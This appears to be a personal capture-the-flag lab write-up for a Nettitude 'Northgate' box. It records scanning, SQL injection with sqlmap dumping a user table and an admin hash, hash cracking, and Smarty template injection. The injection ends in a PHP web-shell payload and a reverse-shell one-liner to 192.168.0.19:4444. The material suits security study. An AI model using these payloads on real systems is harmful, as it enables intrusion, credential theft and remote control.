---
tags: [Nettitude]
title: Northgate
created: '2020-10-08T13:10:05.487Z'
modified: '2020-11-10T17:34:02.153Z'
---

# Northgate

- netdiscover -r 192.168.0.0/16


- nmap -Pn -sS -sV -p- -A 192.168.0.21



  - Web server running port 8880
  

  - SQL Injection?

  ```'or 1=1;#```


  > returns all users
  >However, no debug statements, blind.

  - ```sqlmap -u 'http://192.168.0.21:8880/' --forms --crawl=2 --dump```

```sql
+--------+---------------------------------------------------------------------------------------------------+------+---------------------+
| UserId | Note                                                                                              | Id   | DateTime            |
+--------+---------------------------------------------------------------------------------------------------
  +------+---------------------+
| 10     | Flag 1 is: flag1{2230de66aa4547d2325d8d12276f1085}                                                | 1    | 2020-08-27 14:04:34 |
| 6      | TODO: Add some security to the admin panel                                                        | 2    | 2020-05-11 15:16:33 |
| 10     | Have we been hacked again Nick?                                                                   | 3    | 2020-05-21 13:20:22 |
| 6      | Yes, I've temporarily "disabled" the Smarty template engine so we shouldn't have any more issues! | 4    | 2020-05-30 09:47:38 |
+--------+---------------------------------------------------------------------------------------------------+------+---------------------+

[12:35:32] [INFO] table 'Northgate.Notes' dumped to CSV file '/root/.sqlmap/output/192.168.0.21/dump/Northgate/Notes.csv'                                                                                                 
[12:35:32] [INFO] fetching columns for table 'Users' in database 'Northgate'
[12:35:32] [INFO] fetching entries for table 'Users' in database 'Northgate'
[12:35:32] [INFO] recognized possible password hashes in column 'Pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [y/N/q] n
Database: Northgate
Table: Users
[10 entries]
+----------------------------------+------+---------+-----------+----------+--------------------------------------+
| Pass                             | Id   | IsAdmin | Surname   | Forename | EmailAddress                         |
+----------------------------------+------+---------+-----------+----------+--------------------------------------+
| <blank>                          | 1    | 0       | Watt      | Javan    | Javan.Watt@northgate.gov.local       |
| <blank>                          | 2    | 0       | Stokes    | Reece    | Reece.Stokes@northgate.gov.local     |
| <blank>                          | 3    | 0       | Hood      | Yusra    | Yusra.Hood@northgate.gov.local       |
| <blank>                          | 4    | 0       | Garrett   | Lachlan  | Lachlan.Garrett@northgate.gov.local  |
| <blank>                          | 5    | 0       | Collier   | Zofia    | Zofia.Collier@northgate.gov.local    |
| C31AC812DBB4B1A273B3C2D3BD465690 | 6    | 1       | Moon      | Nick     | Nick.Moon@northgate.gov.local        |
| <blank>                          | 7    | 0       | Stuart    | Ebony    | Ebony.Stuart@northgate.gov.local     |
| <blank>                          | 8    | 0       | Blanchard | Baxter   | Baxter.Blanchard@northgate.gov.local |
| <blank>                          | 9    | 0       | Estes     | Humayra  | Humayra.Estes@northgate.gov.local    |
| <blank>                          | 10   | 0       | Perkins   | Viola    | Viola.Perkins@northgate.gov.local    |
+----------------------------------+------+---------+-----------+----------+--------------------------------------+

```


- Hash-Identifier


```bash
root@kali:~/Documents/nettitude# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: C31AC812DBB4B1A273B3C2D3BD465690

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

```

>crackstation.net or hashcat
>>viola is password
>>> Nick.Moon@northgate.gov.local

- Log into admin page

- ```<script>alert(1)</script>```
- XSS Vulnerability?
> Nope, Template Injection
>> Smarty
- syntax {5*5}
- RCE to shell?

```{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}```

or is it php reverse shell

```$sock=fsockopen("192.168.0.19",4444);exec("/bin/sh -i <&3 >&3 2>&3");```


